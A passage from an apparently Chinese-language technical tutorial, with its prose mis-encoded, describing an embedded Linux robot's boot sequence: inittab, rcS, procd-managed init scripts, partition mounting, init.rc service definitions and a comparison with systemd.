<span class="hljs-symbol">:</span><span class="hljs-symbol">:shutdown</span><span class="hljs-symbol">:/etc/init</span>.d/rcS K shutdown
<span class="hljs-symbol">:</span><span class="hljs-symbol">:askconsole</span><span class="hljs-symbol">:/bin/ash</span> --login
</code></pre>
<p><strong>è¯´æ˜</strong>:</p>
<ul>
<li><strong>sysinit</strong>: ç³»ç»Ÿåˆå§‹åŒ–æ—¶æ‰§è¡Œ<code>/etc/init.d/rcS S boot</code></li>
<li><strong>shutdown</strong>: ç³»ç»Ÿå…³é—­æ—¶æ‰§è¡Œ<code>/etc/init.d/rcS K shutdown</code></li>
<li><strong>askconsole</strong>: è¯·æ±‚æ§åˆ¶å°æ—¶æ‰§è¡Œ<code>/bin/ash --login</code></li>
</ul>
<h5 data-id="heading-155">RcSè„šæœ¬</h5>
<p><code>/etc/init.d/rcS</code>è„šæœ¬è´Ÿè´£æ‰§è¡Œå¯åŠ¨å’Œå…³é—­è„šæœ¬ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¯åŠ¨æ—¶æ‰§è¡Œ</span>
/etc/init.d/rcS S boot
    â†“
éå†/etc/rc.d/S*è„šæœ¬
    â†“
æŒ‰STARTå€¼æ’åº
    â†“
ä¾æ¬¡æ‰§è¡Œstartå‡½æ•°
</code></pre>
<p><strong>å¯åŠ¨è„šæœ¬å‘½åè§„åˆ™</strong>:</p>
<ul>
<li><strong>S##name</strong>: å¯åŠ¨è„šæœ¬ï¼Œ##æ˜¯STARTå€¼ï¼ˆä¸¤ä½æ•°å­—ï¼‰</li>
<li><strong>K##name</strong>: å…³é—­è„šæœ¬ï¼Œ##æ˜¯STOPå€¼ï¼ˆä¸¤ä½æ•°å­—ï¼‰</li>
</ul>
<h4 data-id="heading-156">8.2.6 Init.rcæœåŠ¡ç®¡ç†</h4>
<h5 data-id="heading-157">Procdè¿›ç¨‹ç®¡ç†</h5>
<p>Init.rcæœåŠ¡ä½¿ç”¨<strong>procd</strong>ï¼ˆProcess Daemonï¼‰è¿›è¡Œç®¡ç†ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># /etc/init.d/init.rc</span>
<span class="hljs-function"><span class="hljs-title">start_service</span></span>() {
    <span class="hljs-keyword">if</span> [ -x <span class="hljs-string">"/usr/bin/<span class="hljs-variable">$INITRC</span>"</span> ]; <span class="hljs-keyword">then</span>
        procd_open_instance
        procd_set_param oom_adj <span class="hljs-variable">$OOM_ADJ</span>
        procd_set_param <span class="hljs-built_in">command</span> /bin/sh -c <span class="hljs-string">"source /opt/ros/kinetic/setup.sh &amp;&amp; export PYTHONPATH=/oem/lib/python3.10/dist-packages/:\$PYTHONPATH &amp;&amp; exec /usr/bin/<span class="hljs-variable">$INITRC</span>"</span>
        procd_close_instance
    <span class="hljs-keyword">fi</span>
}
</code></pre>
<p><strong>Procdçš„ä½œç”¨</strong>:</p>
<ul>
<li><strong>è¿›ç¨‹ç›‘æ§</strong>: ç›‘æ§æœåŠ¡è¿›ç¨‹ï¼Œå´©æºƒæ—¶è‡ªåŠ¨é‡å¯</li>
<li><strong>èµ„æºé™åˆ¶</strong>: è®¾ç½®OOMè°ƒæ•´å€¼ï¼Œé˜²æ­¢æœåŠ¡è¢«OOM killeræ€æ­»</li>
<li><strong>ç¯å¢ƒè®¾ç½®</strong>: è®¾ç½®æœåŠ¡è¿è¡Œç¯å¢ƒ</li>
<li><strong>æ—¥å¿—ç®¡ç†</strong>: ç®¡ç†æœåŠ¡çš„æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯è¾“å‡º</li>
</ul>
<h5 data-id="heading-158">æœåŠ¡å¯åŠ¨é¡ºåº</h5>
<p>æœåŠ¡é€šè¿‡<code>START</code>å’Œ<code>DEPEND</code>å‚æ•°æ§åˆ¶å¯åŠ¨é¡ºåºï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># /etc/init.d/init.rc</span>
START=15      <span class="hljs-comment"># å¯åŠ¨é¡ºåºï¼ˆæ•°å­—è¶Šå°è¶Šæ—©å¯åŠ¨ï¼‰</span>
STOP=15       <span class="hljs-comment"># åœæ­¢é¡ºåº</span>
DEPEND=boot   <span class="hljs-comment"># ä¾èµ–bootæœåŠ¡</span>
USE_PROCD=1   <span class="hljs-comment"># ä½¿ç”¨procdç®¡ç†</span>
</code></pre>
<p><strong>ä¾èµ–å…³ç³»</strong>:</p>
<ul>
<li><strong>DEPEND=boot</strong>: å¿…é¡»åœ¨bootæœåŠ¡å¯åŠ¨åæ‰èƒ½å¯åŠ¨</li>
<li><strong>DEPEND=init.rc</strong>: å¿…é¡»åœ¨init.rcæœåŠ¡å¯åŠ¨åæ‰èƒ½å¯åŠ¨</li>
</ul>
<h4 data-id="heading-159">8.2.7 Bootè„šæœ¬è¯¦è§£</h4>
<p>Bootè„šæœ¬ï¼ˆ<code>/etc/init.d/boot</code>ï¼‰æ˜¯ç³»ç»Ÿå¯åŠ¨çš„åŸºç¡€è„šæœ¬ï¼Œè´Ÿè´£ï¼š</p>
<h5 data-id="heading-160">1. åˆ›å»ºå¿…è¦çš„ç›®å½•</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> -p /var/run
<span class="hljs-built_in">mkdir</span> -p /var/log
<span class="hljs-built_in">mkdir</span> -p /var/lock
<span class="hljs-built_in">mkdir</span> -p /var/state
<span class="hljs-built_in">mkdir</span> -p /var/tmp
<span class="hljs-built_in">mkdir</span> -p /tmp/.uci
</code></pre>
<h5 data-id="heading-161">2. æŒ‚è½½è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŒ‚è½½debugfsï¼ˆè°ƒè¯•æ–‡ä»¶ç³»ç»Ÿï¼‰</span>
grep -q debugfs /proc/filesystems &amp;&amp; /bin/mount -o noatime -t debugfs debugfs /sys/kernel/debug

<span class="hljs-comment"># æŒ‚è½½bpfæ–‡ä»¶ç³»ç»Ÿ</span>
grep -q bpf /proc/filesystems &amp;&amp; /bin/mount -o nosuid,nodev,noexec,noatime,mode=0700 -t bpf bpffs /sys/fs/bpf

<span class="hljs-comment"># æŒ‚è½½pstoreï¼ˆæŒä¹…åŒ–å­˜å‚¨ï¼‰</span>
grep -q pstore /proc/filesystems &amp;&amp; /bin/mount -o noatime -t pstore pstore /sys/fs/pstore
</code></pre>
<h5 data-id="heading-162">3. åˆ›å»ºè®¾å¤‡é“¾æ¥</h5>
<pre><code class="hljs language-bash" lang="bash">link_by_name
</code></pre>
<p><strong>ä½œç”¨</strong>: æ ¹æ®å†…æ ¸å‘½ä»¤è¡Œå‚æ•°åˆ›å»º<code>/dev/by-name/</code>ä¸‹çš„è®¾å¤‡é“¾æ¥ï¼Œæ–¹ä¾¿é€šè¿‡åç§°è®¿é—®åˆ†åŒºã€‚</p>
<h5 data-id="heading-163">4. åŠ è½½å†…æ ¸æ¨¡å—</h5>
<pre><code class="hljs language-bash" lang="bash">/sbin/kmodloader
</code></pre>
<p><strong>ä½œç”¨</strong>: åŠ è½½éœ€è¦çš„å†…æ ¸æ¨¡å—ã€‚</p>
<h5 data-id="heading-164">5. åˆå§‹åŒ–è®¾å¤‡ç®¡ç†</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> /sbin/mdev &gt; /proc/sys/kernel/hotplug
/sbin/mdev -s
</code></pre>
<p><strong>ä½œç”¨</strong>: ä½¿ç”¨mdevè¿›è¡Œè®¾å¤‡ç®¡ç†ï¼Œåˆ›å»ºè®¾å¤‡èŠ‚ç‚¹ã€‚</p>
<h5 data-id="heading-165">6. æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿ</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŒ‚è½½robotdataåˆ†åŒº</span>
mount_robotdata

<span class="hljs-comment"># æ ¹æ®æ˜¯å¦åŠ å¯†é€‰æ‹©æŒ‚è½½æ–¹å¼</span>
<span class="hljs-keyword">if</span> grep -q <span class="hljs-string">"crypt"</span> /proc/cmdline; <span class="hljs-keyword">then</span>
    mount_data_enc      <span class="hljs-comment"># åŠ å¯†æ–¹å¼æŒ‚è½½data</span>
    mount_oem_enc       <span class="hljs-comment"># åŠ å¯†æ–¹å¼æŒ‚è½½oem</span>
    mapper_oem_update   <span class="hljs-comment"># å‡†å¤‡oemæ›´æ–°åˆ†åŒº</span>
<span class="hljs-keyword">else</span>
    mount_data_normal   <span class="hljs-comment"># æ™®é€šæ–¹å¼æŒ‚è½½data</span>
    mount_oem_normal    <span class="hljs-comment"># æ™®é€šæ–¹å¼æŒ‚è½½oem</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># æŒ‚è½½userdataåˆ†åŒº</span>
mount_userdata
</code></pre>
<h5 data-id="heading-166">7. æ–‡ä»¶ç³»ç»ŸæŒ‚è½½è¯¦è§£</h5>
<p><strong>Robotdataåˆ†åŒº</strong>:</p>
<ul>
<li><strong>ç”¨é€”</strong>: å­˜å‚¨æœºå™¨äººæ•°æ®</li>
<li><strong>æŒ‚è½½ç‚¹</strong>: <code>/robotdata</code></li>
<li><strong>æŒ‚è½½é€‰é¡¹</strong>: <code>ro,discard,sync,data=journal</code>ï¼ˆåªè¯»ï¼Œé™¤éå·¥å‚æ¨¡å¼ï¼‰</li>
</ul>
<p><strong>Dataåˆ†åŒº</strong>:</p>
<ul>
<li><strong>ç”¨é€”</strong>: å­˜å‚¨åº”ç”¨æ•°æ®</li>
<li><strong>æŒ‚è½½ç‚¹</strong>: <code>/data</code></li>
<li><strong>æ”¯æŒåŠ å¯†</strong>: å¯ä»¥é€šè¿‡dm-cryptåŠ å¯†</li>
</ul>
<p><strong>OEMåˆ†åŒº</strong>:</p>
<ul>
<li><strong>ç”¨é€”</strong>: å­˜å‚¨OEMç›¸å…³æ–‡ä»¶</li>
<li><strong>æŒ‚è½½ç‚¹</strong>: <code>/oem</code></li>
<li><strong>æ”¯æŒA/Båˆ†åŒº</strong>: æ”¯æŒoemAå’ŒoemBä¸¤ä¸ªåˆ†åŒºï¼Œç”¨äºOTAæ›´æ–°</li>
</ul>
<p><strong>Userdataåˆ†åŒº</strong>:</p>
<ul>
<li><strong>ç”¨é€”</strong>: å­˜å‚¨ç”¨æˆ·æ•°æ®</li>
<li><strong>æŒ‚è½½ç‚¹</strong>: <code>/userdata</code></li>
<li><strong>è‡ªåŠ¨æ¸…ç†</strong>: å½“ä½¿ç”¨ç‡è¶…è¿‡90%æ—¶è‡ªåŠ¨æ¸…ç†</li>
</ul>
<h4 data-id="heading-167">8.2.8 Init.rcæœåŠ¡å¯åŠ¨</h4>
<h5 data-id="heading-168">Init.rcæœåŠ¡çš„å¯åŠ¨è„šæœ¬</h5>
<p><code>/etc/init.d/init.rc</code>è„šæœ¬è´Ÿè´£å¯åŠ¨init.rcæœåŠ¡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/sh /etc/rc.common</span>
START=15
STOP=15
DEPEND=boot
USE_PROCD=1

INITRC=<span class="hljs-string">"init.rc"</span>
OOM_ADJ=-17

<span class="hljs-function"><span class="hljs-title">start_service</span></span>() {
    <span class="hljs-keyword">if</span> [ -x <span class="hljs-string">"/usr/bin/<span class="hljs-variable">$INITRC</span>"</span> ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"Starting : <span class="hljs-variable">$INITRC</span>"</span> &gt; /dev/kmsg
        procd_open_instance
        procd_set_param oom_adj <span class="hljs-variable">$OOM_ADJ</span>
        procd_set_param <span class="hljs-built_in">command</span> /bin/sh -c <span class="hljs-string">"source /opt/ros/kinetic/setup.sh &amp;&amp; export PYTHONPATH=/oem/lib/python3.10/dist-packages/:\$PYTHONPATH &amp;&amp; exec /usr/bin/<span class="hljs-variable">$INITRC</span>"</span>
        procd_close_instance
    <span class="hljs-keyword">fi</span>
}
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>:</p>
<ol>
<li><strong>OOM_ADJ=-17</strong>: è®¾ç½®OOMè°ƒæ•´å€¼ä¸º-17ï¼Œé˜²æ­¢è¢«OOM killeræ€æ­»</li>
<li><strong>ROSç¯å¢ƒ</strong>: åŠ è½½ROSï¼ˆRobot Operating Systemï¼‰ç¯å¢ƒ</li>
<li><strong>Pythonè·¯å¾„</strong>: è®¾ç½®Pythonæ¨¡å—æœç´¢è·¯å¾„</li>
<li><strong>æ‰§è¡Œinit.rc</strong>: æ‰§è¡Œ<code>/usr/bin/init.rc</code>ç¨‹åº</li>
</ol>
<h5 data-id="heading-169">Init.rcç¨‹åºçš„å·¥ä½œ</h5>
<p><code>/usr/bin/init.rc</code>ç¨‹åºï¼ˆé€šå¸¸æ˜¯Androidçš„initç¨‹åºæˆ–å…¼å®¹å®ç°ï¼‰ä¼šï¼š</p>
<ol>
<li><strong>è§£æinit.rcæ–‡ä»¶</strong>: è¯»å–<code>/etc/init.rc</code>å¹¶è§£æ</li>
<li><strong>æ‰§è¡Œè§¦å‘å™¨</strong>: æŒ‰é¡ºåºæ‰§è¡Œon initã€on bootç­‰è§¦å‘å™¨</li>
<li><strong>å¯åŠ¨æœåŠ¡</strong>: å¯åŠ¨å®šä¹‰çš„æœåŠ¡</li>
<li><strong>ç›‘æ§æœåŠ¡</strong>: ç›‘æ§æœåŠ¡çŠ¶æ€ï¼Œå´©æºƒæ—¶é‡å¯</li>
<li><strong>å¤„ç†å±æ€§</strong>: å¤„ç†ç³»ç»Ÿå±æ€§çš„å˜åŒ–</li>
</ol>
<h4 data-id="heading-170">8.2.9 è‡ªåŠ¨å¯åŠ¨åº”ç”¨</h4>
<h5 data-id="heading-171">Auto_startupæœåŠ¡</h5>
<p><code>/etc/init.d/auto_startup</code>æœåŠ¡è´Ÿè´£å¯åŠ¨è‡ªåŠ¨å¯åŠ¨çš„åº”ç”¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/sh /etc/rc.common</span>
START=80
STOP=99
DEPEND=init.rc
USE_PROCD=1
PROG=/etc/init.d/app_start

<span class="hljs-function"><span class="hljs-title">start_service</span></span>() {
    procd_open_instance
    procd_set_param <span class="hljs-built_in">command</span> <span class="hljs-variable">$PROG</span> start
    procd_close_instance
}
</code></pre>
<p><strong>å¯åŠ¨é¡ºåº</strong>:</p>
<ul>
<li><strong>START=80</strong>: åœ¨init.rcä¹‹åå¯åŠ¨</li>
<li><strong>DEPEND=init.rc</strong>: ä¾èµ–init.rcæœåŠ¡</li>
<li><strong>æ‰§è¡Œ</strong>: <code>/etc/init.d/app_start start</code></li>
</ul>
<h5 data-id="heading-172">App_startè„šæœ¬</h5>
<p><code>/etc/init.d/app_start</code>è„šæœ¬è´Ÿè´£å¯åŠ¨å…·ä½“çš„åº”ç”¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é€šå¸¸åŒ…å«ï¼š</span>
<span class="hljs-comment"># 1. æ£€æŸ¥åº”ç”¨æ˜¯å¦å­˜åœ¨</span>
<span class="hljs-comment"># 2. è®¾ç½®åº”ç”¨ç¯å¢ƒ</span>
<span class="hljs-comment"># 3. å¯åŠ¨åº”ç”¨è¿›ç¨‹</span>
<span class="hljs-comment"># 4. ç›‘æ§åº”ç”¨çŠ¶æ€</span>
</code></pre>
<h4 data-id="heading-173">8.2.10 Init.rcçš„ä¼˜åŠ¿</h4>
<ol>
<li><strong>çµæ´»æ€§</strong>: å¯ä»¥å®šä¹‰å¤æ‚çš„å¯åŠ¨é€»è¾‘</li>
<li><strong>æœåŠ¡ç®¡ç†</strong>: è‡ªåŠ¨ç›‘æ§å’Œé‡å¯æœåŠ¡</li>
<li><strong>ä¾èµ–ç®¡ç†</strong>: æ”¯æŒæœåŠ¡ä¾èµ–å…³ç³»</li>
<li><strong>è§¦å‘å™¨</strong>: æ”¯æŒå¤šç§å¯åŠ¨æ—¶æœº</li>
<li><strong>èµ„æºæ§åˆ¶</strong>: å¯ä»¥è®¾ç½®èµ„æºé™åˆ¶</li>
</ol>
<h4 data-id="heading-174">8.2.11 Init.rcè°ƒè¯•</h4>
<h5 data-id="heading-175">æŸ¥çœ‹æœåŠ¡çŠ¶æ€</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰æœåŠ¡çŠ¶æ€</span>
/etc/init.d/&lt;service&gt; status

<span class="hljs-comment"># æŸ¥çœ‹init.rcæœåŠ¡çŠ¶æ€</span>
/etc/init.d/init.rc status
</code></pre>
<h5 data-id="heading-176">æ‰‹åŠ¨æ§åˆ¶æœåŠ¡</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¯åŠ¨æœåŠ¡</span>
/etc/init.d/&lt;service&gt; start

<span class="hljs-comment"># åœæ­¢æœåŠ¡</span>
/etc/init.d/&lt;service&gt; stop

<span class="hljs-comment"># é‡å¯æœåŠ¡</span>
/etc/init.d/&lt;service&gt; restart

<span class="hljs-comment"># é‡æ–°åŠ è½½é…ç½®</span>
/etc/init.d/&lt;service&gt; reload
</code></pre>
<h5 data-id="heading-177">æŸ¥çœ‹æ—¥å¿—</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹å†…æ ¸æ—¥å¿—</span>
dmesg

<span class="hljs-comment"># æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—</span>
logread

<span class="hljs-comment"># æŸ¥çœ‹ç‰¹å®šæœåŠ¡çš„æ—¥å¿—</span>
/etc/init.d/&lt;service&gt; <span class="hljs-built_in">log</span>
</code></pre>
<h4 data-id="heading-178">8.2.12 Init.rcä¸Systemdçš„å¯¹æ¯”</h4>













































<table><thead><tr><th>ç‰¹æ€§</th><th>Init.rc</th><th>Systemd</th></tr></thead><tbody><tr><td>è¯­æ³•</td><td>Androidé£æ ¼</td><td>INIé£æ ¼</td></tr><tr><td>è¿›ç¨‹ç®¡ç†</td><td>procd</td><td>systemd</td></tr><tr><td>æœåŠ¡å®šä¹‰</td><td>serviceå…³é”®å­—</td><td>[Service]æ®µ</td></tr><tr><td>è§¦å‘å™¨</td><td>on init/bootç­‰</td><td>targetå’Œä¾èµ–</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>åµŒå…¥å¼ã€OpenWrt</td><td>æ¡Œé¢ã€æœåŠ¡å™¨</td></tr><tr><td>èµ„æºå ç”¨</td><td>è¾ƒå°</td><td>è¾ƒå¤§</td></tr><tr><td>åŠŸèƒ½ä¸°å¯Œåº¦</td><td>ä¸­ç­‰</td><td>éå¸¸ä¸°å¯Œ</td></tr></tbody></table>
<h4 data-id="heading-179">8.2.13 Init.rcé…ç½®ç¤ºä¾‹</h4>
<h5 data-id="heading-180">å®Œæ•´çš„Init.rcé…ç½®ç¤ºä¾‹</h5>
<pre><code class="hljs language-rc" lang="rc"># /etc/init.rc

# åˆå§‹åŒ–é˜¶æ®µ
on init
    # å¯¼å…¥cgroupé…ç½®
    import /etc/cgroup.rc
    
    # è®¾ç½®ç¯å¢ƒå˜é‡
    export PATH /usr/bin:/usr/sbin:/bin:/sbin

# å¯åŠ¨é˜¶æ®µ
on boot
    # å¯åŠ¨é»˜è®¤ç±»
    class_start default
    
    # å¯¼å…¥å…¶ä»–é…ç½®
    import /oem/node/nardds/conf/init/nardds.rc

# å¯åŠ¨åé˜¶æ®µ
on startup
    # åå°å¯åŠ¨å¯åŠ¨è„šæœ¬
    exec /usr/bin/startup_app.sh &amp;

# å®šä¹‰æœåŠ¡
service toplog /oem/script/utils/dump_top_log.sh
    oneshot
    disabled

service audio_server /oem/script/utils/audio_server
    retry 10
    disabled

service dhcpcd /sbin/dhcpcd -f /etc/dhcpcd.conf
    suc_oneshot
    retry 10
    disabled
</code></pre>
<h5 data-id="heading-181">æœåŠ¡å®šä¹‰è¯¦è§£</h5>
<pre><code class="hljs language-rc" lang="rc">service &lt;name&gt; &lt;path&gt; [&lt;argument&gt;]*
    &lt;option&gt;
    &lt;option&gt;
    ...
</code></pre>
<p><strong>é€‰é¡¹è¯´æ˜</strong>:</p>
<ul>
<li><strong>oneshot</strong>: æœåŠ¡åªæ‰§è¡Œä¸€æ¬¡</li>
<li><strong>suc_oneshot</strong>: æˆåŠŸæ‰§è¡Œä¸€æ¬¡åé€€å‡º</li>
<li><strong>retry </strong>: å¤±è´¥åé‡è¯•Næ¬¡</li>
<li><strong>disabled</strong>: é»˜è®¤ä¸å¯åŠ¨</li>
<li><strong>class </strong>: æŒ‡å®šæœåŠ¡ç±»</li>
<li><strong>user </strong>: æŒ‡å®šè¿è¡Œç”¨æˆ·</li>
<li><strong>group </strong>: æŒ‡å®šè¿è¡Œç»„</li>
<li><strong>seclabel </strong>: æŒ‡å®šSELinuxæ ‡ç­¾</li>
</ul>
<h3 data-id="heading-182">8.3 Systemdå¯åŠ¨æµç¨‹ï¼ˆå‚è€ƒï¼‰</h3>
<h4 data-id="heading-183">8.3.1 Systemdæ¦‚è¿°</h4>
<p>Systemdæ˜¯ç°ä»£Linuxç³»ç»Ÿæœ€å¸¸ç”¨çš„initç³»ç»Ÿï¼Œä½†æœ¬ç³»ç»Ÿä½¿ç”¨çš„æ˜¯init.rcæœºåˆ¶ã€‚</p>
<h4 data-id="heading-184">8.3.2 Systemdå¯åŠ¨é˜¶æ®µ</h4>
<p>Systemdå®šä¹‰äº†å¤šä¸ªå¯åŠ¨ç›®æ ‡ï¼ˆtargetï¼‰ï¼š</p>
<ol>
<li><strong>emergency.target</strong>: ç´§æ€¥æ¨¡å¼</li>
<li><strong>rescue.target</strong>: æ•‘æ´æ¨¡å¼</li>
<li><strong>multi-user.target</strong>: å¤šç”¨æˆ·æ¨¡å¼ï¼ˆæ— å›¾å½¢ç•Œé¢ï¼‰</li>
<li><strong>graphical.target</strong>: å›¾å½¢ç•Œé¢æ¨¡å¼</li>
</ol>
<h4 data-id="heading-185">8.3.3 Systemdå•å…ƒç±»å‹</h4>
<ul>
<li><strong>service</strong>: ç³»ç»ŸæœåŠ¡</li>
<li><strong>target</strong>: å¯åŠ¨ç›®æ ‡ï¼ˆç±»ä¼¼è¿è¡Œçº§åˆ«ï¼‰</li>
<li><strong>mount</strong>: æŒ‚è½½ç‚¹</li>
<li><strong>socket</strong>: å¥—æ¥å­—</li>
<li><strong>timer</strong>: å®šæ—¶å™¨</li>
</ul>
<h4 data-id="heading-186">8.3.4 Systemdå¯åŠ¨é¡ºåº</h4>
<pre><code class="hljs language-markdown" lang="markdown">systemdå¯åŠ¨
<span class="hljs-code">    â†“
åŠ è½½å•å…ƒæ–‡ä»¶
    â†“
è§£æä¾èµ–å…³ç³»
    â†“
æŒ‰ä¾èµ–é¡ºåºå¯åŠ¨æœåŠ¡
    â†“
è¾¾åˆ°é»˜è®¤target
    â†“
ç³»ç»Ÿå°±ç»ª
</span></code></pre>
<h3 data-id="heading-187">8.4 ç³»ç»ŸæœåŠ¡å¯åŠ¨</h3>
<h4 data-id="heading-188">8.4.1 æœåŠ¡å¯åŠ¨é¡ºåº</h4>
<p>åœ¨æœ¬ç³»ç»Ÿä¸­ï¼ŒæœåŠ¡æŒ‰ä»¥ä¸‹é¡ºåºå¯åŠ¨ï¼š</p>
<ol>
<li><strong>BootæœåŠ¡</strong> (START=10): æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿã€åˆå§‹åŒ–ç¡¬ä»¶</li>
<li><strong>ç³»ç»ŸæœåŠ¡</strong> (START=12-13): syslogdã€klogdç­‰æ—¥å¿—æœåŠ¡</li>
<li><strong>Init.rcæœåŠ¡</strong> (START=15): å¯åŠ¨init.rcï¼Œæ‰§è¡Œinit.rcè„šæœ¬</li>
<li><strong>åº”ç”¨æœåŠ¡</strong> (START=80): è‡ªåŠ¨å¯åŠ¨çš„åº”ç”¨</li>
</ol>
<h4 data-id="heading-189">8.4.2 æœåŠ¡ä¾èµ–</h4>
<p>æœåŠ¡é€šè¿‡<code>DEPEND</code>å‚æ•°å®šä¹‰ä¾èµ–å…³ç³»ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># /etc/init.d/init.rc</span>
DEPEND=boot  <span class="hljs-comment"># ä¾èµ–bootæœåŠ¡</span>

<span class="hljs-comment"># /etc/init.d/auto_startup</span>
DEPEND=init.rc  <span class="hljs-comment"># ä¾èµ–init.rcæœåŠ¡</span>
</code></pre>
<p><strong>ä¾èµ–æœºåˆ¶</strong>:</p>
<ul>
<li>è¢«ä¾èµ–çš„æœåŠ¡å¿…é¡»å…ˆå¯åŠ¨</li>
<li>å¦‚æœä¾èµ–çš„æœåŠ¡å¯åŠ¨å¤±è´¥ï¼Œå½“å‰æœåŠ¡ä¸ä¼šå¯åŠ¨</li>
<li>ä¾èµ–å…³ç³»é€šè¿‡procdç®¡ç†</li>
</ul>
<h4 data-id="heading-190">8.4.3 æœåŠ¡å¯åŠ¨æ§åˆ¶</h4>
<p>æœåŠ¡é€šè¿‡<code>START</code>å€¼æ§åˆ¶å¯åŠ¨é¡ºåºï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># STARTå€¼è¶Šå°ï¼Œå¯åŠ¨è¶Šæ—©</span>
S10boot      <span class="hljs-comment"># START=10ï¼Œæœ€æ—©å¯åŠ¨</span>
S12syslogd   <span class="hljs-comment"># START=12</span>
S15init.rc   <span class="hljs-comment"># START=15</span>
S80auto_startup  <span class="hljs-comment"># START=80ï¼Œè¾ƒæ™šå¯åŠ¨</span>
</code></pre>
<h3 data-id="heading-191">8.5 ç™»å½•å’Œç”¨æˆ·ä¼šè¯</h3>
<h4 data-id="heading-192">8.5.1 ç™»å½•ç®¡ç†å™¨</h4>
<p>åœ¨æœ¬ç³»ç»Ÿä¸­ï¼Œé€šå¸¸ä½¿ç”¨ï¼š</p>
<ul>
<li><strong>getty</strong>: æ–‡æœ¬ç»ˆç«¯ç™»å½•ï¼ˆåµŒå…¥å¼ç³»ç»Ÿå¸¸ç”¨ï¼‰</li>
<li><strong>ä¸²å£ç™»å½•</strong>: é€šè¿‡ä¸²å£è¿›è¡Œç™»å½•</li>
<li><strong>SSHç™»å½•</strong>: é€šè¿‡ç½‘ç»œSSHç™»å½•</li>
</ul>
<h4 data-id="heading-193">8.5.2 ç”¨æˆ·ä¼šè¯å¯åŠ¨</h4>
<p>ç”¨æˆ·ç™»å½•åï¼Œå¯åŠ¨ç”¨æˆ·ä¼šè¯ï¼š</p>
<ol>
<li><strong>åŠ è½½ç”¨æˆ·é…ç½®</strong>: åŠ è½½<code>.bashrc</code>ã€<code>.profile</code>ç­‰</li>
<li><strong>è®¾ç½®ç¯å¢ƒå˜é‡</strong>: è®¾ç½®PATHã€ROSç¯å¢ƒç­‰</li>
<li><strong>å¯åŠ¨åº”ç”¨</strong>: æ ¹æ®é…ç½®å¯åŠ¨åº”ç”¨</li>
</ol>
<h3 data-id="heading-194">8.6 å¯åŠ¨è„šæœ¬</h3>
<h4 data-id="heading-195">8.6.1 å¯åŠ¨è„šæœ¬ä½ç½®</h4>
<p>åœ¨æœ¬ç³»ç»Ÿä¸­ï¼Œå¯åŠ¨è„šæœ¬ä½äºï¼š</p>
<ul>
<li><strong><code>/etc/init.d/</code></strong>: å®é™…çš„å¯åŠ¨è„šæœ¬</li>
<li><strong><code>/etc/rc.d/</code></strong>: å¯åŠ¨æ—¶çš„ç¬¦å·é“¾æ¥ï¼ˆSå¼€å¤´ï¼‰å’Œå…³é—­æ—¶çš„ç¬¦å·é“¾æ¥ï¼ˆKå¼€å¤´ï¼‰</li>
<li><strong><code>/etc/init.rc</code></strong>: init.rcä¸»é…ç½®æ–‡ä»¶</li>
<li><strong><code>/oem/</code></strong>: OEMç‰¹å®šçš„å¯åŠ¨è„šæœ¬</li>
</ul>
<h4 data-id="heading-196">8.6.2 å¯åŠ¨è„šæœ¬æ‰§è¡Œæµç¨‹</h4>
<pre><code class="hljs language-bash" lang="bash">ç³»ç»Ÿå¯åŠ¨
    â†“
è¯»å–/etc/inittab
    â†“
æ‰§è¡Œ/etc/init.d/rcS S boot
    â†“
éå†/etc/rc.d/S*è„šæœ¬
    â†“
æŒ‰STARTå€¼æ’åº
    â†“
ä¾æ¬¡æ‰§è¡Œstartå‡½æ•°
    â†“
æ‰€æœ‰æœåŠ¡å¯åŠ¨å®Œæˆ
</code></pre>
<h4 data-id="heading-197">8.6.3 å¯åŠ¨è„šæœ¬ç»“æ„</h4>
<p>æ¯ä¸ªå¯åŠ¨è„šæœ¬éƒ½éµå¾ªç›¸åŒçš„ç»“æ„ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/sh /etc/rc.common</span>

START=10      <span class="hljs-comment"># å¯åŠ¨é¡ºåº</span>
STOP=98       <span class="hljs-comment"># åœæ­¢é¡ºåº</span>
DEPEND=boot   <span class="hljs-comment"># ä¾èµ–å…³ç³»</span>
USE_PROCD=1   <span class="hljs-comment"># ä½¿ç”¨procdç®¡ç†</span>

<span class="hljs-function"><span class="hljs-title">start_service</span></span>() {
    <span class="hljs-comment"># å¯åŠ¨æœåŠ¡çš„ä»£ç </span>
}

<span class="hljs-function"><span class="hljs-title">stop_service</span></span>() {
    <span class="hljs-comment"># åœæ­¢æœåŠ¡çš„ä»£ç </span>
}

<span class="hljs-function"><span class="hljs-title">reload_service</span></span>() {
    <span class="hljs-comment"># é‡æ–°åŠ è½½é…ç½®çš„ä»£ç </span>
}
</code></pre>
<h4 data-id="heading-198">8.6.4 è„šæœ¬æ‰§è¡Œé¡ºåºç¤ºä¾‹</h4>
